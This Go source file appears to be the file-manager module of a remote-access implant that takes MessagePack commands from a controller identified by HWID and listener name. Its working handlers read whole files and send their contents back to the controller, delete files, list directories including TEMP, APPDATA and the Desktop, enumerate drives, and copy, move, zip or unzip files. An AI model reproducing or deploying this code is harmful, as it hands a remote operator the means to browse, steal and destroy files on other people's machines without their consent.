package handle

import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	Function "main/Helper/function"
	"main/MessagePack"
	"main/PcInfo"
	"os"
	"path/filepath"
	"strings"
)

func DeleteFile[T any](Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {

	fullPath := unmsgpack.ForcePathObject("FilePath").GetAsString()
	//Path := strings.ReplaceAll(unmsgpack.ForcePathObject("Path").GetAsString(), "\\", "/")
	// 将所有的反斜杠替换为斜杠
	normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "/")
	err := os.Remove(normalizedPathStr)
	if err != nil {

	}

	RefreshDir(Connection, sendFunc, unmsgpack)

}

func readFileToString(path string) (string, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}
	str := string(b)
	return str, nil
}

func FileRead[T any](Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	pathStr := unmsgpack.ForcePathObject("Path").GetAsString()

	// 将所有的反斜杠替换为斜杠
	normalizedPathStr := strings.ReplaceAll(pathStr, "\\", "/")

	// 现在normalizedPathStr包含了替换后的路径
	str, err := readFileToString(normalizedPathStr)

	if err != nil {
		Function.SessionLog(err.Error(), "", Connection, sendFunc, unmsgpack)
		return
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("FileContext")
	msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ReadInput").SetAsString(str)
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())

	sendFunc(msgpack.Encode2Bytes(), Connection)
}
func RefreshDir[T any](Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	result, err := ListDir(unmsgpack.ForcePathObject("Path").GetAsString())
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		result = err.Error()
		return
	}
	//fmt.Println("calc")
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("Path").GetAsString())
	msgpack.ForcePathObject("File").SetAsString(result)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	sendFunc(msgpack.Encode2Bytes(), Connection)
}
func ListDir(path string) (string, error) {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return "", err
	}

	modTime := fileInfo.ModTime()
	modTimeStr := modTime.Format("02/01/2006 15:04:05")

	files, err := ioutil.ReadDir(path)
	if err != nil {
		return "", err
	}

	fileInfos := []string{}

	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		var fileType string
		switch mode := file.Mode(); {
		case mode.IsDir():
			fileType = "D" // 目录
		case mode.IsRegular():
			fileType = "F" // 普通文件
		case mode&os.ModeSymlink != 0:
			fileType = "D" // 符号链接
		default:
			fileType = "U" // 未知类型
		}

		fileInfo := fmt.Sprintf("%s-=>%s-=>%s-=>%d-=>%s", file.Name(), modTimeStr, fileType, file.Size(), file.Mode().Perm())
		fileInfos = append(fileInfos, fileInfo)
	}

	resultStr := strings.Join(fileInfos, "-=>")
	return resultStr, nil
}
func GetCurrentPath[T any](Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	var PathA = unmsgpack.ForcePathObject("Path").GetAsString()
	var GlobalPath string
	switch PathA {
	case "TEMP":
		GlobalPath = os.Getenv("TEMP")

	case "APPDATA":
		{
			GlobalPath = os.Getenv("APPDATA")

		}

	case "DESKTOP":
		GlobalPath = os.Getenv("USERPROFILE") + "\\Desktop"

	default:

		GlobalPath = PathA

	}

	result, err := ListDir(GlobalPath)
	if err != nil {

		return
	}
	//fmt.Println(result)
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject(("CurrentPath")).SetAsString(GlobalPath)
	msgpack.ForcePathObject("File").SetAsString(result)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	sendFunc(msgpack.Encode2Bytes(), Connection)
}
func GetDrivers[T any](Connection T, sendFunc func([]byte, T), unmsgpack *MessagePack.MsgPack) {
	if PcInfo.GroupInfo == "Windows" {
		var sbDriver strings.Builder
		for drive := 'A'; drive <= 'Z'; drive++ {
			drivePath := fmt.Sprintf("%s:\\", string(drive))
			if _, err := os.Stat(drivePath); err == nil {
				sbDriver.WriteString(fmt.Sprintf("%s-=>DriveType-=>-=>D-=>-=>-=>", drivePath))
			}
		}

		//fmt.Println(sbDriver.String())
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("getDrivers")
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject("Driver").SetAsString(sbDriver.String())
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		sendFunc(msgpack.Encode2Bytes(), Connection)
	} else {
		result, err := ListDir("/")
		if err != nil {
			return
		}
		//fmt.Println(result)
		msgpack := new(MessagePack.MsgPack)
		msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
		msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
		msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
		msgpack.ForcePathObject(("CurrentPath")).SetAsString("/")
		msgpack.ForcePathObject("File").SetAsString(result)
		msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
		sendFunc(msgpack.Encode2Bytes(), Connection)
	}

}

func CopyFile(srcFile, dstFile string) error {
	input, err := ioutil.ReadFile(srcFile)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dstFile, input, 0644)
	if err != nil {
		return err
	}
	return nil
}

func PasteFile(srcFile, dstFile string) error {
	return CopyFile(srcFile, dstFile)
}

func CutFile(srcFile, dstFile string) error {
	err := CopyFile(srcFile, dstFile)
	if err != nil {
		return err
	}
	err = os.Remove(srcFile)
	if err != nil {
		return err
	}
	return nil
}

func RenameFile(oldName, newName string) error {
	err := os.Rename(oldName, newName)
	if err != nil {
		return err
	}
	return nil
}
func Zip(src, dest string) error {

	zipfile, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	archive := zip.NewWriter(zipfile)
	defer archive.Close()
	err = filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		header.Name = path

		header.Method = zip.Deflate

		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
		}
		return err
	})

	return err
}
func Unzip(src, dest string) error {
	// Open the zip archive for reading
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {

		fpath := filepath.Join(dest, f.Name)
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return fmt.Errorf("%s: illegal file path", fpath)
		}

		// If it's a directory, create it
		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
		} else {
			// Create a file for writing
			if err := os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
				return err
			}

			outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return err
			}

			rc, err := f.Open()
			if err != nil {
				return err
			}
			_, err = io.Copy(outFile, rc)

			outFile.Close()
			rc.Close()

			if err != nil {
				return err
			}
		}
	}
	return nil
}
